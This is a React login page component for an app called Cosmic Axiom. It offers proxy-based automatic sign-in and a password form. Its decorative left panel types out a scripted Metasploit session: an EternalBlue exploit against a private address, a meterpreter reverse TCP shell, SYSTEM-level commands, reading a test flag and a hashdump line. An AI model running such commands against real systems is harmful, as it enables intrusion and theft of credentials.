import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { Typewriter } from "react-simple-typewriter";

function Login() {
    const navigate = useNavigate();
    const [username, setUsername] = useState("");
    const [password, setPassword] = useState("");
    const [error, setError] = useState("");
    const [loading, setLoading] = useState(false);

    const [lines, setLines] = useState([]);
    const [currentWordIndex, setCurrentWordIndex] = useState(0);

    const pentestWords = [
        "msfconsole > use exploit/windows/smb/ms17_010_eternalblue",
        "set RHOSTS 10.0.0.5",
        "set PAYLOAD windows/meterpreter/reverse_tcp",
        "set LHOST 10.0.0.2",
        "exploit",
        "[*] Started reverse TCP handler on 10.0.0.2:4444",
        "[*] Sending stage...",
        "[*] Meterpreter session 1 opened!",
        "meterpreter > sysinfo",
        "Computer: target-pc",
        "OS: Windows 10 Pro (Build 19045)",
        "Architecture: x64",
        "meterpreter > ipconfig",
        "IPv4 Address: 10.0.0.5",
        "Subnet Mask: 255.255.255.0",
        "Default Gateway: 10.0.0.1",
        "meterpreter > getuid",
        "Server username: NT AUTHORITY\\SYSTEM",
        "meterpreter > ps",
        "PID  Name         Arch  Session  User",
        " 420 svchost.exe  x64   0        SYSTEM",
        " 768 explorer.exe x64   1        target-pc\\user",
        "meterpreter > shell",
        "C:\\Windows\\system32> whoami",
        "nt authority\\system",
        "C:\\Windows\\system32> net users",
        "Administrator  Guest  user",
        "C:\\Windows\\system32> cd \\Users\\Administrator\\Desktop",
        "C:\\Users\\Administrator\\Desktop> dir",
        "flag.txt",
        "C:\\Users\\Administrator\\Desktop> type flag.txt",
        "FLAG{TH1S-1S-4-TEST-FLAG}",
        "C:\\Windows\\system32> exit",
        "meterpreter > hashdump",
        "Administrator:500:aad3b435b51404eeaad3b435b51404ee:1c8f1e6e31f43ef7e69b8f1f1a9c7f1a:::",
    ];

    useEffect(() => {
        if (currentWordIndex < pentestWords.length) {
            const timeout = setTimeout(() => {
                setLines((prev) => [...prev, pentestWords[currentWordIndex]]);
                setCurrentWordIndex((prev) => prev + 1);
            }, 1200);
            return () => clearTimeout(timeout);
        } else {
            const resetTimeout = setTimeout(() => {
                setLines([]);
                setCurrentWordIndex(0);
            }, 4000);
            return () => clearTimeout(resetTimeout);
        }
    }, [currentWordIndex]);

    // Sign in from an authenticating proxy, when the deployment has one.
    //
    // Behind forward-auth (Tailscale Serve, oauth2-proxy, Authelia, an ALB with
    // OIDC) the proxy has already established who this is, and astral exchanges
    // that identity for a token at POST /auth/token. That route exists only when
    // astral runs with AUTH_MODE=trusted-header; anywhere else the request
    // reaches something that is not astral and does not answer with a token, and
    // the password form below works exactly as before. So this needs no
    // configuration: a deployment that routes /auth/token to astral gets
    // automatic sign-in, and one that does not is unaffected.
    useEffect(() => {
        let cancelled = false;

        (async () => {
            try {
                const url = import.meta.env.VITE_AUTH_TOKEN_URL || "/auth/token";
                const response = await fetch(url, { method: "POST" });
                const type = response.headers.get("content-type") || "";
                if (!type.includes("application/json")) return;

                const data = await response.json();
                if (cancelled) return;

                if (response.ok && data.token) {
                    localStorage.setItem("token", data.token);
                    navigate("/dashboard", { replace: true });
                } else if (data.error) {
                    // astral answered and refused: say why, rather than leaving
                    // someone behind a proxy staring at a password they never had.
                    setError(`Automatic sign-in failed: ${data.error}`);
                }
            } catch {
                // Not reachable, or not JSON: sign in with a password as usual.
            }
        })();

        return () => {
            cancelled = true;
        };
    }, [navigate]);

    const handleSubmit = async (e) => {
        e.preventDefault();
        setError("");
    
        if (!username || !password) {
            setError("Please enter both username and password.");
            return;
        }
    
        setLoading(true);
    
        try {
            const response = await fetch(`${import.meta.env.VITE_SATELLITE_URL}/users/login`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({ username, password }),
            });
    
            const data = await response.json();
    
            if (!response.ok) {
                throw new Error(data.error || "Login failed");
            }
    
            localStorage.setItem("token", data.token);
            navigate("/dashboard");
        } catch (err) {
            setError(err.message);
            setLoading(false);
        }
    };
    

    return (
        <div className="flex h-screen w-screen">
            {/* Left Panel: Terminal Typing */}
            <div className="w-[60%] h-full bg-black text-green-400 font-mono p-8 overflow-hidden flex flex-col">
                <div className="flex-1 overflow-y-auto">
                    {lines.map((line, idx) => (
                        <div key={idx} className="text-sm leading-relaxed">
                            <Typewriter
                                words={[line]}
                                typeSpeed={40}
                                cursor={idx === lines.length - 1}
                                cursorBlinking
                            />
                        </div>
                    ))}
                </div>
            </div>

            {/* Right Panel: Login Form */}
            <div className="w-[40%] h-full bg-gray-100 dark:bg-gray-900 flex items-center justify-center">
                <div className="w-full max-w-xs p-8 bg-white dark:bg-gray-800 rounded-lg shadow-md">
                    {/* Cosmic Axiom Title with Logo */}
                    <div className="flex flex-col items-center mb-6">
                        <img src="https://cdn-icons-png.flaticon.com/512/3212/3212608.png" alt="Cosmic Axiom Logo" className="w-16 h-16 mb-2" />
                        <h1 className="text-2xl font-bold text-gray-900 dark:text-gray-100">
                            Cosmic Axiom
                        </h1>
                    </div>

                    {/* Login Form Title */}
                    <h2 className="text-xl font-semibold text-gray-700 dark:text-gray-300 mb-4 text-center">
                        Login
                    </h2>

                    <form onSubmit={handleSubmit} className="space-y-6">
                        {error && (
                            <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-2 rounded text-sm">
                                {error}
                            </div>
                        )}

                        <div>
                            <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
                                Username
                            </label>
                            <input
                                type="text"
                                value={username}
                                onChange={(e) => setUsername(e.target.value)}
                                className="w-full p-3 rounded border border-gray-300 dark:border-gray-600 bg-white dark:bg-gray-700 text-gray-900 dark:text-white focus:outline-none focus:ring-2 focus:ring-indigo-500"
                                required
                            />
                        </div>

                        <div>
                            <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
                                Password
                            </label>
                            <input
                                type="password"
                                value={password}
                                onChange={(e) => setPassword(e.target.value)}
                                className="w-full p-3 rounded border border-gray-300 dark:border-gray-600 bg-white dark:bg-gray-700 text-gray-900 dark:text-white focus:outline-none focus:ring-2 focus:ring-indigo-500"
                                required
                            />
                        </div>

                        <button
                            type="submit"
                            disabled={loading}
                            className="w-full py-3 rounded bg-indigo-600 hover:bg-indigo-700 text-white font-semibold transition disabled:opacity-60"
                        >
                            {loading ? "Logging in..." : "Login"}
                        </button>

                        <div className="text-right">
                            <a href="#" className="text-sm text-red-500 hover:text-red-600 hover:underline">
                                Forgot Password?
                            </a>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    );
}

export default Login;
